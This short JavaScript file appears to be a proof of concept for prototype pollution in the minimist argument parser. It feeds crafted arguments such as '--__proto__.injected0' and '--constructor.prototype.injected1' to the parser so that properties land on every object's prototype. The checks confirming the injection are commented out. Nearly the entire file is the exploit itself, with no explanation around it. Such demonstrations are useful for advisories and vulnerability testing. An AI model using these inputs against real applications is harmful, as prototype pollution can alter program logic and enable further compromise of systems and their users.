const minimist = require('minimist');

// require('minimist')('--__proto__.injected0 value0'.split(' ')); console.log(({}).injected0 === 'value0'); // true require
require('minimist')('--constructor.prototype.injected1 value1'.split(' ')); //console.log(({}).injected1 === 'value1'); // true

